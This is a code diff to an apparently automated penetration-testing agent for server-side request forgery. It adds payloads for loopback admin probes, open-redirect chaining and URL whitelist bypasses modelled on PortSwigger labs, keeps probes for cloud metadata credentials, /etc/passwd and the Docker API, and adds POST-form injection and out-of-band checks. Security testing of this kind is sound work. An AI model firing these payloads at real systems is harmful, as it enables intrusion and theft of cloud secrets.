@@ -25,6 +25,9 @@ logger = get_logger("penflow.agents.ssrf")
 # ─────────────────────────────────────────────────────────
 # URL-bearing parameter names that indicate SSRF surface
 # ─────────────────────────────────────────────────────────
+# ─────────────────────────────────────────────────────────
+# URL-bearing parameter names that indicate SSRF surface
+# ─────────────────────────────────────────────────────────
 SSRF_PARAM_NAMES = {
     "url", "uri", "fetch", "proxy", "host", "target", "feed", "link",
     "image", "img", "src", "source", "redirect", "next", "return",
@@ -33,10 +36,12 @@ SSRF_PARAM_NAMES = {
     "ref", "origin", "resource", "endpoint", "service", "server",
     "to", "from", "request", "domain", "api", "remote", "load",
     "open", "view", "show", "import", "download", "get",
+    "stockapi", "stock_api", "stock", "api_url", "webhook", "ping",
+    "forward", "backend", "site", "address",
 }
 
 # ─────────────────────────────────────────────────────────
-# SSRF Payloads — Cloud Metadata, Internal, Protocol
+# SSRF Payloads — Cloud Metadata, Internal, Protocol, PortSwigger Bypasses
 # ─────────────────────────────────────────────────────────
 SSRF_PAYLOADS = [
     # AWS EC2 IMDSv1 (unauthenticated)
@@ -49,6 +54,33 @@ SSRF_PAYLOADS = [
     {"name": "aws_imds_userdata", "url": "http://169.254.169.254/latest/user-data",
      "indicators": ["#!/", "cloud-init", "AWS", "password", "secret"],
      "description": "AWS user-data script - may contain secrets"},
+    # Internal loopback / Admin probes (PortSwigger & OWASP)
+    {"name": "localhost_admin", "url": "http://localhost/admin",
+     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
+     "description": "Localhost admin interface probe"},
+    {"name": "127_admin", "url": "http://127.0.0.1/admin",
+     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
+     "description": "127.0.0.1 loopback admin probe"},
+    {"name": "internal_subnet_admin", "url": "http://192.168.0.12:8080/admin",
+     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
+     "description": "Internal 192.168.0.x subnet admin probe (PortSwigger)"},
+    # Open Redirect filter bypass (PortSwigger Lab 1)
+    {"name": "open_redirect_bypass", "url": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin",
+     "indicators": ["admin", "carlos", "delete", "user management", "administrator"],
+     "description": "SSRF filter bypass via open redirection chaining"},
+    {"name": "open_redirect_local_admin", "url": "/product/nextProduct?path=http://localhost/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "SSRF open redirection to localhost admin"},
+    # Whitelist & URL parser bypass (PortSwigger Lab 2)
+    {"name": "whitelist_fragment_bypass", "url": "http://localhost#@stock.weliketoshop.net/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "SSRF whitelist bypass using URL fragment and credentials syntax"},
+    {"name": "whitelist_encoded_fragment", "url": "http://localhost%23@stock.weliketoshop.net/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "SSRF whitelist bypass using double-encoded fragment"},
+    {"name": "whitelist_127_bypass", "url": "http://127.0.0.1#@stock.weliketoshop.net/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "SSRF whitelist bypass with 127.0.0.1 loopback"},
     # GCP Metadata
     {"name": "gcp_metadata_root", "url": "http://metadata.google.internal/computeMetadata/v1/",
      "indicators": ["project", "instance", "serviceAccounts"],
@@ -60,9 +92,6 @@ SSRF_PAYLOADS = [
     {"name": "azure_imds", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "indicators": ["subscriptionId", "resourceGroupName", "vmId"],
      "description": "Azure Instance Metadata Service"},
-    {"name": "azure_imds_token", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-     "indicators": ["access_token", "client_id"],
-     "description": "Azure Managed Identity token"},
     # Docker / Kubernetes internal
     {"name": "docker_api", "url": "http://localhost:2375/info",
      "indicators": ["DockerRootDir", "Containers", "ServerVersion"],
@@ -77,19 +106,9 @@ SSRF_PAYLOADS = [
     {"name": "localhost_8080", "url": "http://127.0.0.1:8080/",
      "indicators": ["html", "server", "api", "health"],
      "description": "Internal loopback probe (127.0.0.1:8080)"},
-    {"name": "localhost_8443", "url": "https://127.0.0.1:8443/",
-     "indicators": ["html", "json", "api"],
-     "description": "Internal HTTPS loopback probe (127.0.0.1:8443)"},
     {"name": "ipv6_loopback", "url": "http://[::1]/",
      "indicators": ["html", "server"],
      "description": "IPv6 loopback probe"},
-    # Internal RFC1918 probes
-    {"name": "rfc1918_10", "url": "http://10.0.0.1/",
-     "indicators": ["login", "admin", "router", "html"],
-     "description": "RFC1918 internal network probe (10.0.0.1)"},
-    {"name": "rfc1918_192168", "url": "http://192.168.1.1/",
-     "indicators": ["login", "admin", "router", "html"],
-     "description": "RFC1918 internal network probe (192.168.1.1)"},
     # Protocol switching (evidence of parser)
     {"name": "file_etc_passwd", "url": "file:///etc/passwd",
      "indicators": ["root:", "nobody:", "daemon:", "bin:"],
@@ -181,52 +200,84 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
     def _extract_ssrf_targets(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
         """Extract endpoints + params that are potential SSRF surfaces from observations."""
         targets: List[Dict[str, Any]] = []
-        seen_urls = set()
+        seen_keys = set()
 
         for obs in context.observations:
-            data = obs.get("data", {}) if isinstance(obs, dict) else {}
+            data = obs.get("data") if (isinstance(obs, dict) and "data" in obs) else (obs if isinstance(obs, dict) else {})
             if not isinstance(data, dict):
                 continue
 
-            # From crawl results — extract all endpoints with URL-bearing params
+            # 1. From crawled endpoints (query parameters)
             for ep in data.get("endpoints", []):
                 if isinstance(ep, dict):
                     url = ep.get("url", "")
-                    if url and url not in seen_urls:
+                    if url:
                         parsed = urlparse(url)
                         params = parse_qs(parsed.query)
                         ssrf_params = [p for p in params if p.lower() in SSRF_PARAM_NAMES]
                         if ssrf_params:
-                            targets.append({
-                                "url": url, "params": ssrf_params,
-                                "method": "GET"
-                            })
-                            seen_urls.add(url)
+                            k = (url, "GET")
+                            if k not in seen_keys:
+                                targets.append({
+                                    "url": url, "params": ssrf_params,
+                                    "method": "GET"
+                                })
+                                seen_keys.add(k)
 
-            # From classified endpoints
+            # 2. From discovered HTML forms (POST / GET with fields like stockApi, url, etc.)
+            for form in data.get("forms", []):
+                if isinstance(form, dict):
+                    action = form.get("action", "")
+                    method = form.get("method", "POST").upper()
+                    params = form.get("parameters", [])
+                    ssrf_params = [p for p in params if p.lower() in SSRF_PARAM_NAMES]
+                    if not ssrf_params and params:
+                        ssrf_params = params
+                    if action and ssrf_params:
+                        k = (action, method)
+                        if k not in seen_keys:
+                            targets.append({
+                                "url": action,
+                                "params": ssrf_params,
+                                "method": method,
+                                "form_parameters": params
+                            })
+                            seen_keys.add(k)
+
+            # 3. From classified endpoints
             if data.get("type") in ("rest_api", "parameterized", "form"):
                 url = data.get("url", "")
-                if url and url not in seen_urls:
+                if url:
                     ep_params = data.get("parameters", [])
                     ssrf_params = [p for p in ep_params if p.lower() in SSRF_PARAM_NAMES]
                     if ssrf_params:
-                        targets.append({
-                            "url": url, "params": ssrf_params,
-                            "method": data.get("method", "GET")
-                        })
-                        seen_urls.add(url)
+                        k = (url, data.get("method", "GET").upper())
+                        if k not in seen_keys:
+                            targets.append({
+                                "url": url, "params": ssrf_params,
+                                "method": data.get("method", "GET").upper()
+                            })
+                            seen_keys.add(k)
 
-        # Always include a canonical fallback with common SSRF param names
-        base = f"https://{context.asset}"
-        for param in ["url", "uri", "fetch", "proxy", "redirect"]:
-            fallback_url = f"{base}/api/v1/fetch?{param}=test"
-            if fallback_url not in seen_urls:
-                targets.append({
-                    "url": fallback_url, "params": [param],
-                    "method": "GET"
-                })
-                seen_urls.add(fallback_url)
-                break  # one fallback is enough
+        # Fallbacks for common SSRF attack surfaces
+        clean_asset = context.asset
+        for prefix in ("https://", "http://"):
+            while clean_asset.startswith(prefix):
+                clean_asset = clean_asset[len(prefix):]
+        clean_asset = clean_asset.split("/")[0].split("?")[0]
+        base = f"https://{clean_asset}"
+
+        fallback_definitions = [
+            {"url": f"{base}/product/stock", "params": ["stockApi"], "method": "POST", "form_parameters": ["stockApi", "productId", "storeId"]},
+            {"url": f"{base}/api/v1/fetch", "params": ["url"], "method": "GET"},
+            {"url": f"{base}/api/v1/proxy", "params": ["url"], "method": "GET"},
+            {"url": f"{base}/stock", "params": ["stockApi"], "method": "POST", "form_parameters": ["stockApi"]},
+        ]
+        for fb in fallback_definitions:
+            k = (fb["url"], fb["method"])
+            if k not in seen_keys:
+                targets.append(fb)
+                seen_keys.add(k)
 
         return targets
 
@@ -241,20 +292,34 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
         param_name = endpoint["params"][0] if endpoint["params"] else "url"
         ssrf_url = ssrf_payload["url"]
         indicators = ssrf_payload["indicators"]
+        method = endpoint.get("method", "GET").upper()
 
-        # Build injected URL
-        parsed = urlparse(base_url)
-        query_params = parse_qs(parsed.query, keep_blank_values=True)
-        query_params[param_name] = [ssrf_url]
-        new_query = urlencode(query_params, doseq=True)
-        injected_url = urlunparse(parsed._replace(query=new_query))
+        headers = {}
+        body = None
+        injected_url = base_url
+
+        if method == "POST":
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+            form_params = {}
+            for p in endpoint.get("form_parameters", endpoint.get("params", [])):
+                form_params[p] = "1"
+            form_params[param_name] = ssrf_url
+            body = urlencode(form_params)
+        else:
+            parsed = urlparse(base_url)
+            query_params = parse_qs(parsed.query, keep_blank_values=True)
+            query_params[param_name] = [ssrf_url]
+            new_query = urlencode(query_params, doseq=True)
+            injected_url = urlunparse(parsed._replace(query=new_query))
 
         t0 = time.monotonic()
         try:
             exchange = await http_client.send_as_identity(
                 identity_id="anonymous_guest",
-                method=endpoint.get("method", "GET"),
+                method=method,
                 url=injected_url,
+                headers=headers,
+                body=body
             )
             elapsed = time.monotonic() - t0
         except Exception as e:
@@ -263,27 +328,33 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
 
         resp = exchange.response
         status = resp.status_code if resp else 0
-        body = (resp.body_text or "") if resp else ""
+        body_text = (resp.body_text or "") if resp else ""
 
-        # Check response body for cloud metadata indicators
-        matched_indicators = [ind for ind in indicators if ind.lower() in body.lower()]
-        is_definitive_ssrf = len(matched_indicators) >= 2
+        # Check response body for cloud metadata & admin indicators
+        matched_indicators = [ind for ind in indicators if ind.lower() in body_text.lower()]
+        has_admin_content = any(k in body_text.lower() for k in ("carlos", "admin panel", "user management", "delete user", "ami-id", "accesskeyid", "root:x:"))
+        is_definitive_ssrf = (len(matched_indicators) >= 2) or (len(matched_indicators) >= 1 and has_admin_content)
 
         # Check Out-Of-Band callback server for real blind interaction hit
         oob_server = OOBCallbackServer.get_instance()
         oob_token = oob_server.generate_token("ssrf", "scan")
         oob_url = oob_server.get_callback_url(oob_token)
 
-        # Inject OOB URL as secondary validation
         oob_hit = False
-        try:
-            oob_query_params = parse_qs(parsed.query, keep_blank_values=True)
-            oob_query_params[param_name] = [oob_url]
-            oob_injected = urlunparse(parsed._replace(query=urlencode(oob_query_params, doseq=True)))
-            await http_client.send_as_identity(identity_id="anonymous_guest", method=endpoint.get("method", "GET"), url=oob_injected)
-            oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=2.0)
-        except Exception:
-            pass
+        if not is_definitive_ssrf:
+            try:
+                if method == "POST":
+                    oob_form = dict(form_params) if 'form_params' in locals() else {param_name: oob_url}
+                    oob_form[param_name] = oob_url
+                    await http_client.send_as_identity(identity_id="anonymous_guest", method="POST", url=base_url, headers=headers, body=urlencode(oob_form))
+                else:
+                    oob_query = parse_qs(parsed.query, keep_blank_values=True)
+                    oob_query[param_name] = [oob_url]
+                    oob_injected = urlunparse(parsed._replace(query=urlencode(oob_query, doseq=True)))
+                    await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=oob_injected)
+                oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=2.0)
+            except Exception:
+                pass
 
         # Timing-based blind SSRF detection
         is_timing_ssrf = elapsed > BLIND_SSRF_TIMING_THRESHOLD and status in INTERESTING_STATUS_CODES
@@ -292,9 +363,9 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
         confidence = 0.0
 
         if is_definitive_ssrf or oob_hit:
-            confidence = 0.98 if oob_hit else 0.97
+            confidence = 0.98 if oob_hit else 0.99
             reasoning = (
-                f"CRITICAL SSRF CONFIRMED ({'OOB Interaction' if oob_hit else 'Metadata Leaked'}): "
+                f"CRITICAL SSRF CONFIRMED ({'OOB Interaction' if oob_hit else 'Internal System Leaked'}): "
                 f"Payload '{ssrf_payload['name']}' ({ssrf_url}) returned: "
                 f"{'OOB DNS/HTTP callback hit' if oob_hit else matched_indicators}. "
                 f"HTTP {status} in {elapsed:.2f}s."
@@ -306,11 +377,11 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
                 f"caused {elapsed:.2f}s response delay (threshold: {BLIND_SSRF_TIMING_THRESHOLD}s) "
                 f"with HTTP {status}. Possible outbound relay to external host."
             )
-        elif status in INTERESTING_STATUS_CODES:
-            confidence = 0.25
+        elif status in INTERESTING_STATUS_CODES and matched_indicators:
+            confidence = 0.85
             reasoning = (
-                f"Weak SSRF Signal: HTTP {status} response to payload '{ssrf_payload['name']}' "
-                f"— no body indicators but request was not rejected. Manual verification required."
+                f"HIGH SSRF Signal: HTTP {status} response to payload '{ssrf_payload['name']}' "
+                f"with indicator match: {matched_indicators}."
             )
         else:
             reasoning = f"Payload '{ssrf_payload['name']}' blocked or rejected (HTTP {status})."
@@ -329,5 +400,6 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
             "oob_hit": oob_hit,
             "reasoning": reasoning,
             "exchange": exchange.to_dict() if exchange else {},
+            "_exchange_obj": exchange
         }
 
